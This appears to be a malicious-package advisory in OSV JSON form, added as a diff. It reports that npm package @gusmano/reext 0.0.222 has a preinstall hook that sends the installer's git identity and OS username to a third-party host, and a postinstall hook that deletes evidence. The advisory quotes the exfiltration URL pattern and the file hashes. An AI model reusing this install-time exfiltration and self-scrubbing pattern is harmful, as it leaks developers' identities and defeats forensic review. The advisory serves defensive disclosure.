@@ -1,0 +1,80 @@
+{
+  "modified": "2026-05-13T03:24:49Z",
+  "published": "2026-05-13T03:24:49Z",
+  "schema_version": "1.7.4",
+  "id": "",
+  "summary": "preinstall script exfiltrates installer git identity and OS username to third-party host; postinstall self-scrubs evidence",
+  "details": "At `npm install` time, `dist/scripts/preinstall.js` reads the installer's `~/.gitconfig` (via `iniparser.parseSync(home_dir+'/.gitconfig')`) and OS username (`os.userInfo().username`), then issues an `https.get` to `https://2tak.l.serverhost.name:1962/mobile/reext?osname=...\u0026gitname=...\u0026gitemail=...`. The destination is not on the package's declared publisher domain and the data flow is silent (no README disclosure, no opt-in, no env-var gate). Every developer or CI machine that installs the package will leak the real-name/email identity configured in git plus the OS login name to an attacker-controlled third-party endpoint. Corroborating intent: `dist/scripts/postinstall.js` then rewrites the installed `package.json` to delete the `scripts`, `devDependencies`, `dependencies`, and `eslintConfig` fields and `fs.rmSync`es `./dist/scripts`, `./dist/data`, `./dist/resources`, `./dist/source`, scrubbing the evidence of what ran at install from the on-disk node_modules copy. Anti-forensic self-deletion is not consistent with benign telemetry.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@gusmano/reext"
+      },
+      "versions": [
+        "0.0.222"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "dist/scripts/preinstall.js",
+              "sha256": "560979f1af0494a9ed3a3080ecfeff2f800243ab2da4015d116f256cc9dfec94",
+              "tlsh": "cdf1539699fc00372862af44460f68136ed9fd53e3a8ea10762c5347afe0a7881135ff"
+            },
+            {
+              "path": "dist/scripts/postinstall.js",
+              "sha256": "c67e78b2e229ce533dc53396bad5b6921120a0881addefacf80a7a20645a6faa",
+              "tlsh": "ba31ccbb0fdc43343973a6c27226981a196fd51e30b2f9a066ce225b6d41f9495234fb"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "reext-0.0.222.tgz",
+              "hashes": {
+                "sha1": "e3b5b996aa6fdb05d7abaefcf6c8c06a10c5a815",
+                "sha512_sri": "sha512-ZhmCda2mcz1rXfwWQJFcqpjeFfxVZQ/PWA+pAFlGu7JcN57OVRPVsFimbsgMaHNCJYYATgpdKIXCzk9soArWSw=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@gusmano/reext/v/0.0.222"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "actran@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "source": "amazon-inspector",
+        "sha256": "0eeb28e0cfbeccaea95b07a1c2f192257c44bb8f851fcba9de2c9a8f1286acdf",
+        "import_time": "2026-05-13T20:11:02.530248993Z",
+        "id": "IN-MAL-2026-002613",
+        "modified_time": "2026-05-13T03:24:49Z",
+        "versions": [
+          "0.0.222"
+        ]
+      }
+    ]
+  }
+}
